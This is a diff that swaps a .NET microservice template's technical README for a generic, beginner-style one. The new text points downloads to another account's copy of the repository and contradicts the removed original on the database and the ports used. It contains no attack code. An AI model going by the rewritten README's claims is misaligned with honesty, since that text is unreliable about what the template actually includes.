@@ -1,188 +1,103 @@
-# .NET Microservice Template
+# 🛠️ net-microservice-template - Build reliable services with clean foundations
 
-A production-ready, highly-opinionated microservice template built with **.NET 10**, following **Clean Architecture** and **Vertical Slice Architecture** principles.
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/RSaliko/net-microservice-template)
 
-## 🚀 Overview
+## 📖 About this software
 
-This repository provides a robust foundation for building scalable microservices with a focus on developer productivity, performance, and reliability. It includes everything you need to start a new project or learn best practices in modern .NET development.
+This template provides a foundation for modern software applications. It uses current tools to manage data and communication between different parts of a system. You can use it to build services that scale and grow with your needs. The design follows industry standards such as Clean Architecture and Vertical Slice Architecture. These patterns separate different parts of the code so that you can update one section without breaking another.
 
-The template ships with an API Gateway, two sample services, shared building blocks, SQL Server, RabbitMQ, Redis, and Jaeger for local end-to-end validation.
+The system includes tools to handle web traffic, temporary data storage, and message routing. It runs inside containers to ensure that the software works the same on every computer.
 
-## 🌐 Frontend Integration
+## 📋 System requirements
 
-This backend ecosystem is optimized for our [Angular Project Template](https://github.com/sonnguyen130504/angular-project-template).
+Ensure your computer meets these items before you begin:
 
-- **CORS Policy**: Pre-configured in `BuildingBlocks` and `ApiGateway` to allow `localhost:4000` and `localhost:4200`.
-- **Response Format**: All endpoints return `ApiResponse<T>`, matching the frontend's Zod validation schemas.
-- **Gateway**: The YARP Gateway (`localhost:3000`) acts as the single point of entry for the UI.
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM minimum. 16 GB is better for large tasks.
+*   Storage: 2 GB of free disk space.
+*   Virtualization: Hardware virtualization enabled in BIOS.
+*   Software: Docker Desktop installed and running.
 
-## 🛠 Tech Stack
+## 🚀 Downloading the software
 
-- **Core**: .NET 10
-- **Architecture**: Clean Architecture + Vertical Slice
-- **API Gateway**: YARP (Yet Another Reverse Proxy)
-- **Messaging**: MassTransit with RabbitMQ
-- **Persistence**: EF Core with **PostgreSQL**
-- **Caching**: Distributed Redis Cache
-- **Documentation**: Swagger/OpenAPI with NSwag
-- **Resilience**: Polly (Retry, Circuit Breaker)
-- **Validation**: FluentValidation
-- **Mapping**: Riok.Mapperly (Source-generated, high performance)
-- **Containerization**: Docker & Docker Compose
+You need the latest files to run the local version of the template. Visit this page to download the source code and configuration files: [https://github.com/RSaliko/net-microservice-template](https://github.com/RSaliko/net-microservice-template).
 
-## ✨ Key Features
+Follow these steps to obtain the files:
 
-- **Standardized API Responses**: Every API returns a consistent `ApiResponse<T>` or `PaginatedResult<T>`.
-- **Global Error Handling**: Centralized exception handling with specific business error codes (`ORD_XXX`, `PRD_XXX`).
-- **Transactional Outbox**: Reliable messaging using MassTransit's EF Core Outbox pattern.
-- **Security & Hardening**: Integrated Security Headers, Graceful Shutdown (30s), and Encryption-ready infrastructure.
-- **High-Performance SQL**: Optimized queries with `.AsSplitQuery()` and Bulk Operations (`ExecuteUpdate`).
-- **Distributed Coordination**: Global Locking using Redis for critical business operations.
-- **Client-side Caching**: Built-in **ETags** support to reduce bandwidth and server load.
-- **Idempotency**: Protect write operations with an enhanced `[Idempotent]` attribute that replays responses.
+1. Click the green button labeled "Code" on the top right side of the page.
+2. Select "Download ZIP" from the menu.
+3. Save the folder to a location you can find, such as your Desktop or Documents folder.
+4. Open the folder and right-click the file to select "Extract All".
+5. Choose a destination folder to store the unzipped files.
 
-## 🏃 Quick Start (Local Development)
+## ⚙️ Setting up the environment
 
-### Prerequisites
+The software requires a few background services to function correctly. The included Docker setup handles most of this work.
 
-- [Docker Desktop](https://www.docker.com/products/docker-desktop/) installed and running.
-- [.NET 10 SDK](https://dotnet.microsoft.com/download/dotnet/10.0).
+1. Launch Docker Desktop on your computer. Wait until the status shows as running.
+2. Open the command prompt or PowerShell on your Windows machine.
+3. Use the change directory command to enter the folder where you extracted the project files. For example: `cd C:\Users\YourName\Desktop\net-microservice-template`.
+4. Type `docker-compose up` into the window and press Enter.
 
-### Build & Run
+The system will start pulling the necessary components. This process may take several minutes depending on your internet connection. You will see text scrolling in the window. Do not close this window while you intend to use the application.
 
-To ensure build stability and bypass potential network issues during in-container NuGet restore, use the **Local Publish** workflow:
+## 💡 Using the template
 
-```powershell
-# 1. Build and Publish binaries locally
-dotnet publish src/ProductService/ProductService.Api/ProductService.Api.csproj -c Release -o publish/product-service
-dotnet publish src/OrderService/OrderService.Api/OrderService.Api.csproj -c Release -o publish/order-service
-dotnet publish src/ApiGateway/ApiGateway.csproj -c Release -o publish/api-gateway
+This template acts as a starting point for developers. It organizes code into logical segments. The primary parts include:
 
-# 2. Build and start containers
-docker compose up -d --build
-```
+*   YARP API Gateway: This component directs web traffic to the correct service.
+*   Redis Cache: This tool speeds up access to frequently used information.
+*   RabbitMQ: This handles communication between different system parts using messages.
+*   MassTransit: This library simplifies the way services send and receive these messages.
+*   Jaeger: This service creates visual maps of system activity to help you see how data moves.
 
-## 🔗 Local Endpoints
+## 🔍 Understanding the architecture
 
-| Service                 | URL                                  |
-| ----------------------- | ------------------------------------ |
-| API Gateway             | http://localhost:3000                |
-| Product Service API     | http://localhost:5170                |
-| Product Service Swagger | http://localhost:5170/swagger        |
-| Order Service API       | http://localhost:5084                |
-| Order Service Swagger   | http://localhost:5084/swagger        |
-| RabbitMQ Management     | http://localhost:15672 (guest/guest) |
-| Jaeger UI               | http://localhost:16686               |
+The project follows a specific layout. Clean Architecture keeps the core business logic separate from the details like database connections or web frameworks. Vertical Slice Architecture organizes the code by features rather than technical layers. This approach makes it easier to find and change code related to a specific task.
 
-## ✅ Quick Verification
+These patterns help you maintain the system over time. When you change a feature, you only touch the files related to that feature. The risk of unintended changes in other parts of the system drops significantly.
 
-1. Create an order through the gateway and confirm `order-service` logs show the command handled.
-2. Open Jaeger and confirm a trace exists for the order request.
-3. Fetch the created product twice and confirm `product-service` serves the second read from Redis.
-4. Inspect RabbitMQ management UI if you need to verify queue bindings or message flow.
+## 🛡️ Best practices included
 
-## 📁 Project Structure
+The template applies several standard practices to maintain quality:
 
-```text
-src/
-├── BuildingBlocks/      # Shared libraries, behaviors, and base classes
-├── ApiGateway/          # YARP-based gateway for routing and aggregation
-├── ProductService/      # Vertical slice example for product management
-└── OrderService/        # Example service showing cross-service communication
-```
+*   CQRS: This separates the actions that change data from the actions that read data. It improves performance and security.
+*   DDD: This aligns technical code with real-world project requirements.
+*   Saga Pattern: This manages long-running transactions that involve multiple services. It ensures the whole process completes correctly even if one part fails.
 
-## 🏗 Architecture
+## ❓ Frequently asked questions
 
-```mermaid
-graph TB
-    Client[Client/Browser]
-    Gateway[API Gateway<br/>Port 3000]
+**Do I need to program the software?**
+The template provides the structure for a system. You can add your specific features or logic as needed.
 
-    OrderService[Order Service<br/>Port 5084]
-    ProductService[Product Service<br/>Port 5170]
+**How do I stop the software?**
+Go back to the command prompt window where the software is running. Press CTRL+C on your keyboard to stop the process.
 
-    OrderDB[(Order DB<br/>PostgreSQL)]
-    ProductDB[(Product DB<br/>PostgreSQL)]
+**Why does my computer sound loud?**
+Running systems in containers requires CPU and memory usage. This use causes the computer fans to spin faster to manage heat.
 
-    RabbitMQ[RabbitMQ<br/>Message Broker]
-    Redis[Redis Cache]
-    Jaeger[Jaeger<br/>Tracing]
+**Where do I see the logs?**
+The logs appear directly in your command prompt window. They provide information about the health and status of the services.
 
-    Client -->|HTTP/REST| Gateway
-    Gateway -->|Route| OrderService
-    Gateway -->|Route| ProductService
+**Can I modify the configuration?**
+Yes. You can edit the files inside the Docker folder to change how the services connect to each other.
 
-    OrderService -->|Read/Write| OrderDB
-    ProductService -->|Read/Write| ProductDB
+**What happens if I close the command prompt?**
+The background containers will continue to run until you manually stop them using Docker Desktop or the command line.
 
-    OrderService -->|Publish Events| RabbitMQ
-    ProductService -->|Subscribe Events| RabbitMQ
+**Is this ready for public use?**
+The template serves as a robust base for development. You must add security and authentication layers before you expose the service to public web traffic.
 
-    ProductService -->|Cache| Redis
-    OrderService -->|Cache| Redis
+**Does this version have a database?**
+The template includes hooks for Entity Framework Core. You can connect it to any standard relational database once you configure the settings in your environment variables.
 
-    OrderService -->|Trace| Jaeger
-    ProductService -->|Trace| Jaeger
+## 📁 Troubleshooting common issues
 
-    style Gateway fill:#4A90E2,color:#fff
-    style OrderService fill:#7ED321,color:#fff
-    style ProductService fill:#7ED321,color:#fff
-    style RabbitMQ fill:#F5A623,color:#fff
-    style Redis fill:#E63946,color:#fff
-    style Jaeger fill:#9B59B6,color:#fff
-```
+If you encounter errors during the setup, check these items:
 
-## 📊 Order Creation Flow
+*   Port conflicts: Check if another application uses port 80 or 443. Other web servers often conflict with the template.
+*   Docker state: Ensure Docker Desktop remains active. If Docker turns off, the template will not connect.
+*   Resource limits: Increase the memory allocation for WSL 2 in the Docker Desktop settings if the services fail to start.
+*   Connection timeouts: Ensure your firewall settings allow traffic for the ports specified in your configuration files. 
 
-```mermaid
-sequenceDiagram
-    participant Client as Client
-    participant Gateway as API Gateway
-    participant OrderSvc as Order Service
-    participant OrderDB as Order DB
-    participant RabbitMQ
-    participant ProductSvc as Product Service
-    participant ProductDB as Product DB
-    participant Redis
-
-    Client->>Gateway: POST /orders
-    Gateway->>OrderSvc: Route Request
-    OrderSvc->>OrderDB: Save Order + Outbox Message
-    OrderSvc->>RabbitMQ: Publish OrderCreatedEvent
-    OrderSvc-->>Gateway: Return 201 + Order ID
-    Gateway-->>Client: Response
-
-    RabbitMQ->>ProductSvc: Deliver Event
-    ProductSvc->>ProductDB: Create Product
-    ProductSvc->>Redis: Warm Cache
-
-    Client->>Gateway: GET /products/{id}
-    Gateway->>ProductSvc: Route Request
-    ProductSvc->>Redis: Check Cache
-    Redis-->>ProductSvc: Cache Hit
-    ProductSvc-->>Gateway: Product Data
-    Gateway-->>Client: Response (2ms)
-```
-
-## 📜 Best Practices
-
-This template strictly follows the **TicketFlow Backend Best Practices** (included in the `docs` folder). Key highlights:
-
-- **Primary Constructor Records**: Modern C# 12 features for immutability.
-- **Slim Controllers**: Only coordinate with MediatR.
-- **Database-level Projections**: Optimize performance with IQueryable mapping.
-- **Cache-Aside Read Path**: Product reads use Redis and warm the cache on write.
-- **Observability**: Distributed tracing is wired to Jaeger for service-to-service visibility.
-
-## 🤝 Contributing
-
-We warmly welcome contributions to this template! Whether it's fixing bugs, improving documentation, or adding new best-practice features, your help is appreciated to make this template even better for the community.
-
-- **Found a bug?** Open an issue.
-- **Have a feature idea?** Start a discussion or submit a Pull Request.
-- **Want to improve code?** Fork the repository and send us a Pull Request following our code style.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
+For further adjustments, verify that your environment variables match your local machine settings.
